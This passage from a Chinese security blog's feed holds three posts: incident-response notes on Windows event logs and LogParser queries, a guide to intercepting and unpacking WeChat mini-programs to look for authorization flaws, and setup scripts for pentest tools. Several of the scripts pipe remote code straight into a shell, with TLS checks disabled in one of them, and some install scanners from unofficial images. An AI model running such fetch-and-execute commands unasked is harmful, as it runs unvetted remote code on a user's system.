NT&#x2F;2000操作系统预先定义。<br><code>默认位置:%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p></li><li><p>系统日志<br>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程<br>序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许<br>会有助于你解决问题。<br><code>默认位置: %SystemRoot%\System32\Winevt\Logs\System.evtx</code></p></li><li><p>安全日志<br>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事<br>件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或<br>者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。<br><code>默认位置:%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p></li></ul><p>日志记录内容取决于审核策略的配置(默认状态下并没有启用)：【开始】&gt;【管理工具】&gt;【本地安全策略】&gt;【本地策略】&gt;【审核策略】<br><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/shcl.png"></p><p>日志属性设置：日志最大大小、达到覆盖阀值时操作等。<br><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/rizhi.png"></p><ul><li><p><code>Windows</code>事件日志常用<code>EVENT ID</code></p><table><thead><tr><th align="left">事件ID</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">4624</td><td align="left">登录成功</td></tr><tr><td align="left">4625</td><td align="left">登录失败</td></tr><tr><td align="left">4634</td><td align="left">注销成功</td></tr><tr><td align="left">4647</td><td align="left">用户启动的注销</td></tr><tr><td align="left">4720</td><td align="left">创建用户</td></tr></tbody></table></li><li><p>登录类型说明</p><table><thead><tr><th align="left">登录类型</th><th align="left">描述</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">交互式登录(Interactive)</td><td align="left">用户在本地进行登录。</td></tr><tr><td align="left">3</td><td align="left">网络(Network)</td><td align="left">最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td align="left">4</td><td align="left">批处理(Batch)</td><td align="left">通常表明某计划任务启动。</td></tr><tr><td align="left">5</td><td align="left">服务(Service)</td><td align="left">每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td align="left">7</td><td align="left">解锁(Unlock)</td><td align="left">屏保解锁。</td></tr><tr><td align="left">8</td><td align="left">网络明文(NetworkCleartext)</td><td align="left">登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td align="left">9</td><td align="left">新凭证(NewCredentials)</td><td align="left">使用带&#x2F;Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td align="left">10</td><td align="left">远程交互，(RemoteInteractive)</td><td align="left">通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td align="left">11</td><td align="left">缓存交互(CachedInteractive)</td><td align="left">以一个域用户登录而又没有域控制器可用</td></tr></tbody></table></li></ul><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">日志查看: eventvwr.msc 或 【开始】&gt;【控制面板】&gt;【管理工具】&gt;【事件查看器】</span><br></pre></td></tr></table></figure><ul><li><p>LogParser筛选语法：查询登录时间、用户名、类型、进程文件、源IP，输出到4624.csv文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">登录成功:</span><br><span class="line">LogParser.exe -i:EVT -o:csv &quot;SELECT TimeGenerated as LoginTime, EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as username,EXTRACT_TOKEN(Strings, 8, &#x27;|&#x27;) as LogonType,EXTRACT_TOKEN(Strings, 17, &#x27;|&#x27;) AS ProcessName,EXTRACT_TOKEN(Strings, 18, &#x27;|&#x27;) AS SourceIP FROM &#x27;C:\Users\kzaopa\Desktop\10.192.1.114\Security.evtx&#x27; where EventID in (4624)&quot; &gt; C:\Users\kzaopa\Desktop\4624.csv</span><br><span class="line"></span><br><span class="line">登录失败:</span><br><span class="line">LogParser.exe -i:EVT -o:csv &quot;SELECT TimeGenerated as LoginTime, EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as username,EXTRACT_TOKEN(Strings, 10, &#x27;|&#x27;) as LogonType,EXTRACT_TOKEN(Strings, 18, &#x27;|&#x27;) AS ProcessName,EXTRACT_TOKEN(Strings, 19, &#x27;|&#x27;) AS SourceIP FROM &#x27;C:\Users\kzaopa\Desktop\10.192.1.114\Security.evtx&#x27; where EventID in (4625)&quot; &gt; C:\Users\kzaopa\Desktop\4625.csv</span><br></pre></td></tr></table></figure></li><li><p>Log Parser Lizard查询语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">登录成功:</span><br><span class="line">SELECT top 10 ComputerName, TimeGenerated, EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as username,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 8, &#x27;|&#x27;) as LogonType,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 17, &#x27;|&#x27;) AS ProcessName,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 18, &#x27;|&#x27;) AS SourceIP</span><br><span class="line">FROM &#x27;C:\Users\kzaopa\Desktop\10.192.1.114\Security.evtx&#x27;</span><br><span class="line">where EventID in (4624)</span><br><span class="line"></span><br><span class="line">登录失败:</span><br><span class="line">SELECT top 10 ComputerName, TimeGenerated, EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as username,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 10, &#x27;|&#x27;) as LogonType,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 18, &#x27;|&#x27;) AS ProcessName,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 19, &#x27;|&#x27;) AS SourceIP</span><br><span class="line">FROM &#x27;C:\Users\kzaopa\Desktop\10.192.1.114\Security.evtx&#x27;</span><br><span class="line">where EventID in (4625)</span><br><span class="line"></span><br><span class="line">查询时间段内登录失败日志:</span><br><span class="line">SELECT ComputerName, TimeGenerated, EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as username,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 10, &#x27;|&#x27;) as LogonType,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 18, &#x27;|&#x27;) AS ProcessName,</span><br><span class="line">    EXTRACT_TOKEN(Strings, 19, &#x27;|&#x27;) AS SourceIP</span><br><span class="line">FROM &#x27;C:\Users\kzaopa\Desktop\10.192.1.114\Security.evtx&#x27;</span><br><span class="line">where EventID in (4625)</span><br><span class="line">and TO_DATE(TimeGenerated) between timestamp(&#x27;2022-05-26&#x27;, &#x27;yyyy-MM-dd&#x27;) and timestamp(&#x27;2022-05-27&#x27;, &#x27;yyyy-MM-dd&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>Log Parser Lizard查询时间段内登录失败日志<br><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/rzcx.png"></p></li></ul><hr><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><p>dir命令</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/T 控制显示或用来分类的时间字符域。</span><br><span class="line">    C  创建时间</span><br><span class="line">    A  上次访问时间</span><br><span class="line">    W  上次写入的时间</span><br><span class="line"></span><br><span class="line">/O          用分类顺序列出文件。</span><br><span class="line">排列顺序     N  按名称(字母顺序)     S  按大小(从小到大)</span><br><span class="line">            E  按扩展名(字母顺序)   D  按日期/时间(从先到后)</span><br><span class="line">            G  组目录优先          -  反转顺序的前缀</span><br><span class="line"></span><br><span class="line">/A          显示具有指定属性的文件。</span><br><span class="line">属性         D  目录               R  只读文件</span><br><span class="line">            H  隐藏文件            A  准备存档的文件</span><br><span class="line">            S  系统文件            I  无内容索引文件</span><br><span class="line">            L  解析点              -  表示“否”的前缀</span><br></pre></td></tr></table></figure></li><li><p>grep</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">grep显示前后几行信息:</span><br><span class="line">grep -C 3 foo file 显示file文件里匹配foo字串那行以及上下3行</span><br><span class="line">grep -B 3 foo file 显示foo及前3行</span><br><span class="line">grep -A 3 foo file 显示foo及后3行</span><br><span class="line">查看grep版本号的方法是</span><br><span class="line">grep -V</span><br><span class="line"></span><br><span class="line">grep 查找含有某字符串的所有文件:</span><br><span class="line">grep -rn <span class="string">&quot;hello,world!&quot;</span></span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名 </span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure></li><li><p>tail</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f filename.log         循环读取某文件并输出</span><br><span class="line"><span class="built_in">tail</span> -n +20 filename.log     显示文件的内容，从第20行至文件末尾</span><br><span class="line"><span class="built_in">cat</span> input_file | <span class="built_in">tail</span> -n +100 | <span class="built_in">head</span> -n 200      从第100行开始，显示200行。即显示100~299行</span><br><span class="line">-f 循环读取 </span><br><span class="line">-c 显示的字节数</span><br><span class="line">-n 显示文件的尾部 n 行内容 </span><br></pre></td></tr></table></figure></li><li><p>sort</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-n 依照数值的大小排序。</span><br><span class="line">-r 以相反的顺序来排序。</span><br><span class="line">-b 忽略每行前面开始出的空格字符。</span><br><span class="line">-f 排序时，将小写字母视为大写字母。</span><br><span class="line">-d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。</span><br></pre></td></tr></table></figure></li><li><p>uniq</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-c或--count 在每列旁边显示该行重复出现的次数。</span><br><span class="line">-d或--repeated 仅显示重复出现的行列。</span><br></pre></td></tr></table></figure></li><li><p>ls<br><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/lstime.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-a 显示所有文件及目录 (. 开头的隐藏文件也会列出)</span><br><span class="line">-l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出</span><br><span class="line">-r 将文件以相反次序显示(原定依英文字母次序)</span><br><span class="line">-t 将文件依建立时间之先后次序列出</span><br><span class="line">-A 同 -a ，但不列出 <span class="string">&quot;.&quot;</span> (目前目录) 及 <span class="string">&quot;..&quot;</span> (父目录)</span><br><span class="line">-F 在列出的文件名称后加一符号；例如可执行档则加 <span class="string">&quot;*&quot;</span>, 目录则加 <span class="string">&quot;/&quot;</span></span><br><span class="line">-R 若目录下有文件，则以下之文件亦皆依序列出</span><br><span class="line">-h 与-l 一起，以易于阅读的格式输出文件大小(例如 1K 234M 2G)</span><br></pre></td></tr></table></figure></li><li><p>find</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">查找/tmp/目录近一小时修改过的文件: find /tmp/ -mmin -60 -<span class="built_in">type</span> f</span><br><span class="line"><span class="built_in">type</span>:查找某一类型文档</span><br><span class="line">b : 块设备文</span><br><span class="line">d : 目录</span><br><span class="line">c : 字符设备文档</span><br><span class="line">P : 管道文档</span><br><span class="line">l : 符号链接文档</span><br><span class="line">f : 普通文档</span><br><span class="line">[a|c|m]min（分钟）、[a|c|m]time（天）</span><br><span class="line"></span><br><span class="line">find查找时间线理解</span><br><span class="line">---(+n)-------|--------(n)--------|-------(-n)---</span><br><span class="line">  (n+1)*24H前 | (n+1)*24H~n*24H间  |n*24H内</span><br><span class="line">-mtime -n查找距现在 n*24H 内修改过的文件</span><br><span class="line">-mtime n查找距现在 n*24H 前, (n+1)*24H 内修改过的文件</span><br><span class="line">-mtime +n查找距现在 (n+1)*24H 前修改过的文件</span><br></pre></td></tr></table></figure><p><img src="/./2022/06/15/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/findtime.png"></p></li></ul><hr><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><p><a href="https://www.d99net.net/down/d_safe_2.1.6.5.zip" title="d_safe_2.1.6.5.zip">D盾</a> | <a href="https://down5.huorong.cn/sysdiag-all-5.0.68.3-2022.6.16.2.exe" title="sysdiag-all-5.0.68.3-2022.6.16.2.exe">火绒剑</a> | <a href="https://download.microsoft.com/download/f/f/1/ff1819f9-f702-48a5-bbc7-c9656bc74de8/LogParser.msi" title="LogParser.msi">LogParser</a></p><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><ul><li><a href="%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0_2020%E6%9C%80%E6%96%B0%E7%89%88.pdf">应急响应实战笔记_2020最新版.pdf</a></li><li><a href="%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9F%A5%E8%AF%86%E6%89%8B%E5%86%8C20180723-%E5%BC%A0%E6%B0%B8%E5%8D%B0.pdf">应急响应知识手册20180723-张永印.pdf</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> 应急处置 </tag>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序测试</title>
      <link href="/2022/06/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/06/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>找到对应目标小程序后可利用手机或pc上设置代理，在burpsuite捕获发起的<code>http/https</code>请求进行测试。</p><p><img src="/./2022/06/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/zhuabao.png"></p><p>除此之外还可以反编译小程序静态资源包阅读js代码，尝试挖掘可能存在的风险点。微信小程序文件存放路径：</p><p><strong>Android</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.tencent.mm/MicroMsg/&#123;&#123;user哈希值&#125;&#125;/appbrand/pkg/</span><br></pre></td></tr></table></figure><p><strong>IOS</strong></p><blockquote><p>没抓过，不知道</p></blockquote><p><strong>Windows</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&#123;&#123;系统用户名&#125;&#125;\Documents\WeChat Files\Applet\</span><br></pre></td></tr></table></figure><p><strong>MacOS</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/Library/Group Containers/5A4RE8SF68.com.tencent.xinWeChat/Library/Caches/xinWeChat/&#123;&#123;user哈希值&#125;&#125;/WeApp/LocalCache/release/</span><br></pre></td></tr></table></figure><p>找到的文件大概长这个样子，里面可能有一个或多个<code>*.wxapkg</code>包。</p><p><img src="/./2022/06/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/wxapkg.png"></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>用<code>android</code>获取小程序<code>wxapkg</code>包，使用如下工具进行解包。</p><blockquote><p><a href="https://github.com/xuedingmiaojun/wxappUnpacker" title="解包工具">https://github.com/xuedingmiaojun/wxappUnpacker</a></p></blockquote><p>如果是<code>windows</code>和<code>macos</code>上获取的不能直接解包，网上说需要用工具解密后再解包。<del>macos测试失败</del></p><blockquote><p><a href="https://github.com/BlackTrace/pc_wxapkg_decrypt" title="解密工具">https://github.com/BlackTrace/pc_wxapkg_decrypt</a></p></blockquote><p>运行报错尝试安装如下依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">npm i escodegen -S</span><br><span class="line">npm install esprima -g</span><br><span class="line">npm install css-tree -g</span><br><span class="line">npm install cssbeautify -g</span><br><span class="line">npm install vm2 -g</span><br><span class="line">npm install uglify-es -g</span><br><span class="line">npm install js-beautify -g</span><br><span class="line">npm install escodegen -g</span><br></pre></td></tr></table></figure><h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><p>如果存在多个包里面有一个是主包，利用解包工具挨个尝试，没报错的就表示解包成功。 <code>./bingo.sh _-243331381_19.wxapkg</code></p><p><strong>子包</strong><br><img src="/./2022/06/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/zibao.png"><br><strong>主包</strong><br><img src="/./2022/06/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/zhubao.png"></p><p>解包成功文件保存在与<code>*.wxapkg</code>同名文件夹，文件结构大致如下，可以找找接口测试越权、未授权，说不定存有明文密码之类的。</p><p><img src="/./2022/06/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/content.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信 </tag>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base</title>
      <link href="/2022/06/01/base/"/>
      <url>/2022/06/01/base/</url>
      
        <content type="html"><![CDATA[<p><img src="/./2022/06/01/base/year.jpg"></p><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npx hexo server</span><br><span class="line">npx hexo new &#x27;article&#x27;</span><br><span class="line">npx hexo clean      清空./public目录, 既之前生成的所有静态资源文件</span><br><span class="line">npx hexo generate</span><br><span class="line">npx hexo deploy     生成的静态资源在./public目录下, 将push上github即可</span><br><span class="line">themes/cactus/source/css/_partial/post/actions_desktop.styl #toc 标题</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="go"><a href="#go" class="headerlink" title="go"></a>go</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">iGo</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;GO Environment configuration...&#x27;</span></span><br><span class="line">    wget https://go.dev/dl/go1.17.9.linux-amd64.tar.gz</span><br><span class="line">    tar -C /usr/local -xzf go1.17.9.linux-amd64.tar.gz</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:/usr/local/go/bin&#x27;</span> &gt;&gt; /etc/profile</span><br><span class="line">    <span class="built_in">source</span> /etc/profile</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">iNode</span></span>()&#123;</span><br><span class="line">    <span class="built_in">cd</span> /tmp</span><br><span class="line">    wget https://nodejs.org/dist/v16.15.0/node-v16.15.0-linux-x64.tar.xz</span><br><span class="line">    xz -d node-v16.15.0-linux-x64.tar.xz</span><br><span class="line">    tar -xf node-v16.15.0-linux-x64.tar</span><br><span class="line">    <span class="built_in">mv</span> node-v16.15.0-linux-x64 /opt/node-v16.15.0</span><br><span class="line">    <span class="built_in">ln</span> -s /opt/node-v16.15.0/bin/node /usr/local/bin/node</span><br><span class="line">    <span class="built_in">ln</span> -s /opt/node-v16.15.0/bin/npm /usr/local/bin/npm</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">iDcoker</span></span>()&#123;</span><br><span class="line">    curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">    sudo sh get-docker.sh --mirror Aliyun</span><br><span class="line">    <span class="comment"># service docker restart</span></span><br><span class="line">    systemctl restart docker</span><br><span class="line">    sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` -o /usr/local/bin/docker-compose</span><br><span class="line">    <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="l2tp"><a href="#l2tp" class="headerlink" title="l2tp"></a>l2tp</h3><p><code>l2tp</code> 开放端口策略：<code>UDP 500/1701/4500</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">iVPN</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;vpn install...&#x27;</span></span><br><span class="line">    <span class="built_in">cd</span> /tmp/</span><br><span class="line">    wget https://raw.githubusercontent.com/hwdsl2/setup-ipsec-vpn/master/vpnsetup.sh &amp;&amp; sudo sh vpnsetup.sh</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">iMetaSploit</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;metasploit install...&#x27;</span></span><br><span class="line">    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="awvs"><a href="#awvs" class="headerlink" title="awvs"></a>awvs</h3><p>awvs一键安装<del><code>from</code>法海</del>，u&#x2F;p：<code>Awvs@awvs.lan</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -sk https://raw.githubusercontent.com/kzaopa/tools/master/awvs/check.sh) xrsec/awvs</span><br></pre></td></tr></table></figure><h3 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h3><p>docker部署nessus <del><code>from</code>老王&#96;</del>，u&#x2F;p：<code>Nessus</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull 20142995/nessus-10.1.2:20220409</span><br><span class="line">docker run -dit -p 8089:8834 20142995/nessus-10.1.2:20220409</span><br></pre></td></tr></table></figure><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#xray install</span></span><br><span class="line"><span class="function"><span class="title">iXRAY</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;xray install...&#x27;</span></span><br><span class="line">    <span class="built_in">mkdir</span> -p /opt/xray</span><br><span class="line">    <span class="built_in">cd</span> /opt/xray</span><br><span class="line">    wget https://github.com/chaitin/xray/releases/download/1.8.4/xray_linux_amd64.zip</span><br><span class="line">    unzip xray_linux_amd64.zip</span><br><span class="line">    <span class="built_in">mv</span> xray_linux_amd64 xray</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chrome install</span></span><br><span class="line"><span class="function"><span class="title">iChrome</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;chrome install...&#x27;</span></span><br><span class="line">    <span class="built_in">cd</span> /tmp/</span><br><span class="line">    apt install -y libxss1 libappindicator1 libindicator7</span><br><span class="line">    <span class="comment"># centos</span></span><br><span class="line">    wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm</span><br><span class="line">    yum localinstall google-chrome-stable_current_x86_64.rpm</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="some"><a href="#some" class="headerlink" title="some.."></a>some..</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">iTools</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;tools install...&#x27;</span></span><br><span class="line">    yum update</span><br><span class="line">    yum install -y java-1.8.0-openjdk lrzsz git unzip python3-pip nmap</span><br><span class="line">    <span class="comment">#sqlmap</span></span><br><span class="line">    <span class="built_in">cd</span> /opt/</span><br><span class="line">    git <span class="built_in">clone</span> https://github.com/sqlmapproject/sqlmap.git</span><br><span class="line"></span><br><span class="line">    <span class="comment">#dirsearch</span></span><br><span class="line">    <span 